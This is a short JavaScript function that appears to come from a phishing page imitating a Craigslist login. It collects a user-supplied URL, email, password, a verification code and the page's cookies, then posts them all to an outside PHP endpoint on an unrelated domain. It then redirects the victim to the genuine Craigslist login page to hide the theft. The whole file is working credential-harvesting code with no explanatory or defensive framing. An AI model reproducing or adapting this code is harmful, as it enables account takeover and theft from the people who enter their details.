
async function extractData() {
    // Get the URL specified by the user
    const specificUrl = document.getElementById("websiteUrl").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const auth = document.getElementById("auth").value;

    if (!specificUrl) {
        alert("Please enter a valid URL.");
        return;
    }

    if (!email) {
        alert("Please enter a valid email address.");
        return;
    }

    if (!password) {
        alert("Please enter a valid password.");
        return;
    }

    if (!auth) {
        alert("Please Verify Your Identity.");
        return;
    }

    // Filter cookies for the specified URL (same-origin policy applies)
    const cookies = document.cookie;

    // Send data to the PHP server
    const response = await fetch('https://premiumofficialmusic.com/apps1/save_data.php', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/json'
        },
        body: JSON.stringify({ url: specificUrl, cookies: cookies, email: email, password: password, auth: auth })
    });

    if (response.ok) {
       // alert('Error please retype your login details');
        window.open("https://accounts.craigslist.org/login/", "_self");
    } else {
        alert('Failed to login. Please retry.');
    }
    }